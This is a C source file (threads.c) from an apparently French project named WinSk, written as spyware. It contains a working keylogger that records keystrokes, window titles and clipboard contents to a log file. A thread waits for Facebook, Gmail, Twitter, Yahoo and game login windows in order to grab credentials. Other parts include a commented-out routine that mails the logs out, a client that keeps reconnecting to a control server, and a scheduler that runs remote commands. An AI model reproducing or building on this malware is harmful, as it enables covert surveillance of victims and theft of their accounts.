//=============================================================================
// Projet : WinSk
// Fichier : threads.c
//
//=============================================================================

#include "resources.h"
#include <stdlib.h>


//=============================================================================
//      Thread 1 : Espion (Enregistrement des appuies touches claviers)
//=============================================================================

DWORD  WINAPI Espion(LPVOID lParam)
{
   // Interdiction de lancer les threads EspionMdp et Espion au même temp
   if (!Parametres.StopEspionMdp)
      return 0;
   
   SHORT keyState;
   int key, historiqueKey[256] = {0};
   BOOL MAJUSCULE = GetKeyState(VK_CAPITAL); // == 20 == 0x14
   HWND hwnd = NULL;
   char lpFichierLog[MAX_PATH], fenetreActuelle[512];
   
   // Si le Thread client a été arrêté, si nn, c'est lui qui s'occupera de faire ce qui suit
   if (Parametres.StopClientThread)
   {
       // Récupération et enregistrement de la date..
       char *userName, *currentTime;
       userName = user_name(1);
       currentTime = get_time(1);
       ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, userName, 0);
       ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, currentTime, 0);
       free(userName);
       free(currentTime);
   }
   
   FILE *fichier = NULL;
   sprintf(lpFichierLog, "%s\\%s", FILES_PATH, NOM_LOG_FILE);
   
   TU_RECUPERE_FENETRE = TRUE; /* Autorisation pour récupérer le nom de la fenêtre actuelle */
  
   while(!Parametres.StopEspion)
   {
        Sleep(6); /* On réduit la vitesse de la boucle */
        
        /* Récupération de la fenêtre actuelle */
        if (TU_RECUPERE_FENETRE)
        {
           HWND currenthwnd = GetForegroundWindow();
           if (currenthwnd != hwnd) /* Si la fenêtre actuelle != la fenêtre précedente */
           {
              hwnd = currenthwnd; /* Sauvegarde du hwnd (handle de la fenêtre) */
              GetWindowText(hwnd, fenetreActuelle, 512); /* Récupération du nom de la fenetre actuelle */
              fichier = fopen(lpFichierLog, "a"); /* Ouverture du fichier */
              fprintf(fichier, "[| %s |]" ,fenetreActuelle); /* Ecriture */
              fclose(fichier); /* Fermeture du fichier */
              TU_RECUPERE_FENETRE = FALSE;
           }
        }
        
        /* Récupération des touches enfoncées/saisies */
        for(key = 0; key < 256; key++) 
        {
            keyState = GetAsyncKeyState(key);
           // - 48 à 57 (0x30 à 0x39) correspondent aux chiffres 0 à 9 
           // - 96 à 105(0x60 à 0x69) correspondent aux chiffres 0 à 9 du Clavier Numérique (Numeric keypad)
           // - 65 à 90 (0x41 à 0x5A) correspondent aux lettres A à Z
           // - 112 à 123(0x70 à 0x7B)correspondent aux touches Fx (x varie de 1 à 12)
           // - 186 correspondent aux caractères £ $
           // - ...
           
           if ((keyState & 0x00000001) && (keyState & 0x8000000)) /* Si touche enfoncée */
           {
                
               fichier = fopen(lpFichierLog, "a"); /* Ouverture du fichier */
                
               /* Si CTRL + ('C' ou 'V' ou 'X') */
               if((key == 65+'v'-'a' || key == 65+'c'-'a' || key == 65+'x'-'a') && ((historiqueKey[17] && historiqueKey[162]) == 1))
               { 
                  if (OpenClipboard(NULL))
                  {
                     HANDLE clip = GetClipboardData(CF_TEXT);
                     fprintf(fichier, "[(CTRL+%c): ( %s )]", key, clip);
                     CloseClipboard();
                  }
               }
               /* Si Lettre enfoncée */
               else if (key >= 65 && key <= 90) 
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, "%s", &key);
                  else
                  {
                     if (historiqueKey[221] == 1) /* Si Touche Chapeau activé */
                     {
                        if (key == 65)
                           fprintf(fichier, "â");
                        else if (key == 65+'e'-'a')
                           fprintf(fichier, "ê");
                        else if (key == 65+'u'-'a')
                           fprintf(fichier, "û");
                        else if (key == 65+'i'-'a')
                           fprintf(fichier, "î");
                        else if (key == 65+'o'-'a')
                           fprintf(fichier, "ô");
                        else
                        {
                           key += 32;
                           fprintf(fichier, "^%s", &key);   
                        }
                     }
                     else
                     {
                        key += 32;
                        fprintf(fichier, "%s", &key);
                     }
                  }
               }
               /* Si Numeric keypad enfoncé */
               else if(key >= 96 && key <= 105) 
                  fprintf(fichier, "%c", key-96+'0');
               /* Si Chiffre enfoncé */
               else if (key >= 48 && key <= 57)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, "%c", key);
                  else if (((historiqueKey[17] && historiqueKey[18]) && (historiqueKey[162] && (historiqueKey[164] || historiqueKey[165]))) == 1) /* Si CTRL + ALT ou ALT GR activé */
                  {
                     if (key == 48)
                        fprintf(fichier, "@");
                     else if (key == 50)
                        fprintf(fichier, "~");
                     else if (key == 51)
                        fprintf(fichier, "#");
                     else if (key == 52)
                        fprintf(fichier, "{");
                     else if (key == 53)
                        fprintf(fichier, "[");
                     else if (key == 54)
                        fprintf(fichier, "|");
                     else if (key == 55)
                        fprintf(fichier, "`");
                     else if (key == 56)
                        fprintf(fichier, "\\");
                     else if (key == 57)
                        fprintf(fichier, "^");
                  }
                  else
                  {
                     if (key == 48)
                        fprintf(fichier, "à");
                     else if (key == 49)
                        fprintf(fichier, "&");
                     else if (key == 50)
                        fprintf(fichier, "é");
                     else if (key == 51)
                        fprintf(fichier, "\""); // le caractère "
                     else if (key == 52)
                        fprintf(fichier, "'");
                     else if (key == 53)
                        fprintf(fichier, "(");
                     else if (key == 54)
                        fprintf(fichier, "-");
                     else if (key == 55)
                        fprintf(fichier, "è");
                     else if (key == 56)
                        fprintf(fichier, "_");
                     else if (key == 57)
                        fprintf(fichier, "ç");
                  }
               }
               /* Si MAJUSCULE enfoncée (activé/désactivé) */
               else if (key == 20) MAJUSCULE = !MAJUSCULE;
               /* Si les Caractères qui restent enfoncés */
               else if(key == 226)
               {
                  if ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1) /* Si SHIFT activé */
                     fprintf(fichier, ">");
                  else
                     fprintf(fichier, "<");
               }
               else if(key == 188)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, "?");
                  else
                     fprintf(fichier, ",");
               }
               else if(key == 190)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, ".");
                  else
                     fprintf(fichier, ";");
               }
               else if(key == 191)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, "/");
                  else
                     fprintf(fichier, ":");
               }
               else if(key == 223)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, "§");
                  else
                     fprintf(fichier, "!");
               }
               else if(key == 219)
               {
                  if (((historiqueKey[17] && historiqueKey[18]) && (historiqueKey[162] && (historiqueKey[164] || historiqueKey[165]))) == 1) /* Si CTRL + ALT ou ALT GR activé */
                     fprintf(fichier, "]");
                  else if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, "°");
                  else
                     fprintf(fichier, ")");
               }
               else if (key == 186)
               {
                  if (((historiqueKey[17] && historiqueKey[18]) && (historiqueKey[162] && (historiqueKey[164] || historiqueKey[165]))) == 1) /* Si CTRL + ALT ou ALT GR activé */
                     fprintf(fichier, "¤");
                  else if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, "£");
                  else
                     fprintf(fichier, "$");
               }
               else if (key == 220)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, "µ");
                  else
                     fprintf(fichier, "*");
               }
               else if (key == 192)
               {
                  if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, "%");
                  else
                     fprintf(fichier, "ù");
               }
               else if(key == 187)
               {
                  if (((historiqueKey[17] && historiqueKey[18]) && (historiqueKey[162] && (historiqueKey[164] || historiqueKey[165]))) == 1) /* Si CTRL + ALT ou ALT GR activé */
                     fprintf(fichier, "}");
                  else if(MAJUSCULE || ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 1)) /* Si MAJUSCULE ou SHIFT activé */
                     fprintf(fichier, "+");
                  else
                     fprintf(fichier, "=");
               }
               else if (key == 110)
               {
                  if ((historiqueKey[16] && (historiqueKey[160] || historiqueKey[161])) == 0) /* Si SHIFT désactivé */
                     fprintf(fichier, ".");
               }
               else if (key == 107) fprintf(fichier, "+");
               else if (key == 106) fprintf(fichier, "*");
               else if (key == 109) fprintf(fichier, "-");
               else if (key == 111) fprintf(fichier, "/");
               else if(key == 222)  fprintf(fichier, "²");
               /* Si Click Sourie */
               //else if (key == 1) fprintf(fichier, "[L-M]"); // Left-Mouse
               //else if (key == 2) fprintf(fichier, "[R-M]"); // Right-Mouse
               //else if (key == 4) fprintf(fichier, "[M-M]"); // Middle-Mouse
               /* Si Caractères Spéciaux enfoncé */
               else if (key == 8) fprintf(fichier, "[<-]");
               else if (key == 9) fprintf(fichier, "[TAB]");
               else if (key == 13) fprintf(fichier, "[ENTER]");
               //else if (key == 16 && (key == 160 || key == 161)) fprintf(fichier, "[SHIFT]");
               //else if (key == 17 && key == 162) fprintf(fichier, "[CTRL]");
               //else if (key == 18 && key == 164) fprintf(fichier, "[ALT]");
               //else if (key == 17 && key == 18 && key == 164 && key == 165) fprintf(fichier, "[ALT GR]");
               else if (key == 27) fprintf(fichier, "[ESC]");
               else if (key == 32) fprintf(fichier, " "); // Espace
               //else if (key == 37) fprintf(fichier, "[LEFT]");
               //else if (key == 38) fprintf(fichier, "[UP]");
               //else if (key == 39) fprintf(fichier, "[RIGHT]");
               //else if (key == 40) fprintf(fichier, "[DOWN]");
               else if (key == 44) fprintf(fichier, "[IMPR]");
               else if (key == 45) fprintf(fichier, "[INSER]");
               else if (key == 46) fprintf(fichier, "[SUPPR]");
               /* Si F-key (Fx) enfoncé */
               else if (key >= 112 && key <= 120) fprintf(fichier, "[F%c]", key-112+'1'); /* F1 à F9 */
               else if (key == 121) fprintf(fichier, "[F10]");
               else if (key == 122) fprintf(fichier, "[F11]");
               else if (key == 123) fprintf(fichier, "[F12]");
               /* Autres Touches Spécial */
               else if(key == 91) fprintf(fichier, "[WINDOWS]");
               else if(key == 144) fprintf(fichier, "[VERR NUM]");
               //else if(key == 91) fprintf(fichier, "[DEMARRER-D]");
               //else if(key == 92) fprintf(fichier, "[DEMARRER-G]");
               //else if(key == 93) fprintf(fichier, "[T-CLIC-D]");
               //else if(key == 145) fprintf(fichier, "[ARRET DEFIL]");
               
               /* Sauvegarde de la touche actuelle */
               historiqueKey[key] = 1;
               
               fclose(fichier); /* Fermeture du fichier */
               
           } // Sortie du 1er if
           
           /* Raffraichissement de l'historique des touches */
           if(historiqueKey[key] == 1 && !GetAsyncKeyState(key)) /* Si la touche n'est plus enfoncée */
              historiqueKey[key] = 0;
            
        } // Sortie du For
        
   } // Sortie du While
    
return 0;  
}

//=============================================================================
//             Thread 2 : EnvoyerLog (Envoie des logs par smtp)
//=============================================================================
/*
DWORD  WINAPI EnvoyerLog(LPVOID lParam)
{
   while(!Parametres.StopSender)
   {
      // Attente de l'écoulement du temp de récéption
      Sleep(Parametres.TempDeReception*60*1000); // min*60 => sec*1000 => millisec
      // Récupération du contenu du fichier LOG
      char *chaine;
      chaine = malloc(tailleFichier(FILES_PATH, NOM_LOG_FILE, FALSE)); // Allocation mémoire
      lireFichier(FILES_PATH, NOM_LOG_FILE, chaine, 1);
      // Construction du sujet
      char tmp[256], *currentTime;
      currentTime = get_time(1);
      sprintf(tmp, "%s-WinskCl", currentTime);
      free(currentTime);
      // Envoie du mail
      BOOL sendResult = sendMail(Parametres.Email, tmp, chaine);
      // Vidage
      free(chaine);
      // Rénitialisation du fichier LOG après envoie du contenu
      if (sendResult) // si envoie du mail réussie
      {
         char *userName, *currentTime;
         userName = user_name(1);
         currentTime = get_time(1);
         ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, userName, 1);
         ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, currentTime, 0);
         free(userName);
         free(currentTime);
      }
      TU_RECUPERE_FENETRE = TRUE; // On peut récupérer le nom de la fenêtre actuelle
   }

return 0;       
}
*/
//=============================================================================
//          Thread 3 : ClientSocket (Client sécurisé avec ssl/openssl)
//=============================================================================

DWORD  WINAPI ClientSocket(LPVOID lParam)
{
    // On sauvegarde la date d'aujourd'hui et l'heure du lancement
    char *userName, *currentTime;
    userName = user_name(1);
    currentTime = get_time(1);
    ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, userName, 0);
    ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, currentTime, 0);
    free(userName);
    free(currentTime);
    
    // Initialisation de la Connexion au serveur
    init();
    CONNECTED_TO_SERVER = FALSE;
    
    // Tableau contenant les différents noms/adresses serveur à essayer de s'y connecter
    char serversList[][100] = {PARAMETRE_SERVER, "192.168.1.7", "192.168.1.10"};
    int i;
    
    while (!Parametres.StopClientThread)
    {
        // Tentative(s) de connexion au serveur(s)
        for (i = 0; i < (sizeof serversList / sizeof *serversList); i++)
        {
            app(user_name(2), serversList[i], Parametres.Port); // @le pointeur vers user_name() est libéré dans la fonction app() 
            Sleep(1000); // 1 seconde d'attente
        }
        
        //printf("Waiting a while before retry connecting...\n");
        #if NO_GUI == FALSE
        appendToRichConsole("Waiting a while before retry connecting...", "");
        #endif
        Sleep(PARAMETRE_SERVER_RECONNECT_TIMEOUT); /* temps d'attente avant reconnexion */
    }

    end();

return 0;
}

//=============================================================================
//            Thread 4 : EspionMdp (enregistre les identifiants)
//=============================================================================

DWORD  WINAPI EspionMdp(LPVOID lParam)
{
   // Interdiction de lancer les threads EspionMdp et Espion au même temp
   if (!Parametres.StopEspion)
      return 0;
   
   HWND hFenetre = NULL;
   char nomFenetre[MAX_FENETRE_TAILLE];
   char fenetresCibles[][100] = {"Facebook", "Gmail", "Connexion", "Sign In", "Twitter", "Yahoo", "Nostale", "Dofus"};
   MUST_RESET_LOG = FALSE;
   
   // Si le Thread client a été arrêté, si nn, c'est lui qui s'occupera de faire ce qui suit
   if (Parametres.StopClientThread)
   {
       /* On sauvegarde la date d'aujourd'hui et l'heure du lancement */
       char *userName, *currentTime;
       userName = user_name(1);
       currentTime = get_time(1);
       ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, userName, 0);
       ecrireDansFichier(FILES_PATH, NOM_LOG_FILE, currentTime, 0);
       free(userName);
       free(currentTime);
   }
   
   while (!Parametres.StopEspionMdp)
   {
      while (etatConnexion()) /* Tant que la connexion existe */
      {
         hFenetre = GetForegroundWindow(); /* On récupère le handle de la fenêtre qui a le focus */
         GetWindowText(hFenetre, nomFenetre, MAX_FENETRE_TAILLE); /* On récupère le nom de cette fenêtre */
         
         int i;
         for (i = 0; i < (sizeof fenetresCibles / sizeof *fenetresCibles); i++)
         {
            if (strstr(nomFenetre, fenetresCibles[i]) != NULL) /* Si c'est la fenêtre cible */
            {
               recupererIdentifiants(fenetresCibles[i]);
               break; /* On sort de la dernière boucle */
            }
         }
         
         Sleep(2000); /* On attend 2 secondes */
      }
      
      Sleep(3000); /* On attend 3 secondes */
      
   } // Sortie du while(1)

return 0;
}

//=============================================================================
//          Thread 5 : ToDo (commande(s) à exécuter prochainement)
//=============================================================================

DWORD  WINAPI ToDoThread(LPVOID lParam)
{
    // Initialisation de la ToDoList
    ToDoList = NULL;
    
    // Exécution des actions/commandes à toujours faire (à chaque démarrage)
    ToAlwaysDo();
    
    while (!Parametres.StopClientThread) // tant que le client n'a pas été arrété
    {
        Sleep(60000); /* 1 minute d'attente */
        
        // Vérification de la ToDoList
        ToDo *iterToDo; // iterator
        for (iterToDo = ToDoList; iterToDo != NULL; iterToDo = iterToDo->next) {
            
            // on retire une minute du temps restant (pour tout les ToDo)
            iterToDo->time--;
            
            #if NO_GUI == FALSE
            char tmp[COMMANDE_SIZE];
            sprintf(tmp, "[%d] %s in %d min", iterToDo->id, iterToDo->commande, iterToDo->time);
            appendToRichConsole("ToDo", tmp);
            #endif
            
            // si c'est le moment d'exécution
            if (iterToDo->time <= 0)
            {
                // S'il y'a une commande à exécuter
                if (lstrlen(iterToDo->commande) > 0)
                {
                    #if NO_GUI == FALSE
                    appendToRichConsole("Execute ToDo", iterToDo->commande);
                    #endif
                    effectuerCommande(NULL, iterToDo->commande, FALSE);
                }
                
                // suppression du ToDo
                ToDoList = delete_ToDo(ToDoList, iterToDo->id);
            }
        }
        
        #if NO_GUI == FALSE
        if (ToDoList == NULL) appendToRichConsole("ToDo Thread", "[No ToDo]");
        appendToRichConsole("ToDo Thread", "Going sleep for 1 minute...");
        #endif
    }
    
    // Vidage de la ToDoList
    free_ToDo(ToDoList);

return 0;
}
